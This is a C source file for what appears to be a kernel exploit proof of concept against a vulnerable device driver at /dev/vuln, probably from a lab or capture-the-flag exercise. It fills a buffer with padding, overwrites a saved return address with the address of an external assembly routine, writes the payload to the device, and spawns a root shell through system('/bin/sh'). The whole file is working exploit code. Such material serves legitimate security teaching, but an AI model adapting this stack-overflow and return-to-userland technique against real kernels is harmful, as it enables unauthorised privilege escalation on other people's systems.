#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

extern void asm_exploit(void);
extern void get_regs(void);

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_flags;
#define USTACKSZ 1024
unsigned char __attribute__((aligned(16))) user_stack[USTACKSZ];
unsigned char *user_stack_end = user_stack + USTACKSZ - sizeof(unsigned long);

#define OFFSET (5*8+16)
#define PAYLOAD_LINES 1

#define PAYLOADSZ (OFFSET + PAYLOAD_LINES * sizeof(unsigned long))
char payload[PAYLOADSZ];

int main()
{
	int fd;
	int i;
	char *p;

	get_regs();

	for (p = payload; p < payload + OFFSET; p++) {
		*p = 'A';
	}
	*(unsigned long*)p = (unsigned long)&asm_exploit;

	fd = open("/dev/vuln", O_WRONLY);
	if (fd < 0) {
		perror("/dev/vuln");
		exit(1);
	}

	i = 0;
	while (i < PAYLOADSZ) {
		int n = write(fd, payload + i, PAYLOADSZ - i);
		if (n < 0) {
			perror("write");
			exit(1);
		}
		i += n;
	}
}

void cont()
{
	system("/bin/sh");
	_exit(0);
}
